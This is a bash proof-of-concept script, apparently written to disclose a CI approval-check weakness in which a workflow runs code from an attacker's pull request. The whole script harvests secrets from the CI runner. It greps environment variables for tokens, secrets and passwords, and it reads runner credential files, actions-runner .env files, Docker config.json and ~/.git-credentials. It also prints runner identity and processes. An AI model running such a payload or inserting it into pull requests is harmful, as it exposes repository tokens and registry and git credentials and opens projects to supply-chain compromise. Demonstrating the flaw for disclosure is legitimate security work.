#!/bin/bash
echo "=== PoC #3: Approval Check Supply Chain Attack (Paddle Pattern) ==="
echo "[*] Simulating: checkout attacker PR HEAD → execute ci/check_approval.sh"
echo "[*] ref: github.event.pull_request.head.sha (攻击者控制的代码)"
echo ""
echo "[+] Runner identity:"
whoami && hostname && id
echo ""
echo "[+] GITHUB_TOKEN & secrets exposure:"
echo "  GITHUB_TOKEN=${GITHUB_TOKEN:0:20}..."
env | grep -iE "TOKEN|SECRET|KEY|PASSWORD|CREDENTIAL|GITHUB_" | sort
echo ""
echo "[+] Runner configuration:"
find / -maxdepth 5 -name ".credentials" -o -name ".credentials_rsaparams" -o -name ".runner" 2>/dev/null
echo ""
echo "[+] Runner .env file:"
find / -maxdepth 5 -name ".env" -path "*actions-runner*" -exec cat {} \; 2>/dev/null
echo ""
echo "[+] Docker credentials:"
cat ~/.docker/config.json 2>/dev/null || echo "  (not found)"
find / -maxdepth 4 -name "config.json" -path "*docker*" 2>/dev/null
echo ""
echo "[+] Git credentials:"
git config --global --list 2>/dev/null | grep -i credential || echo "  (none)"
cat ~/.git-credentials 2>/dev/null || echo "  (no git-credentials file)"
echo ""
echo "[+] Process list (runner-related):"
ps aux 2>/dev/null | grep -E "Runner|runner|actions" | grep -v grep | head -10
echo ""
echo "=== End PoC #3 ==="
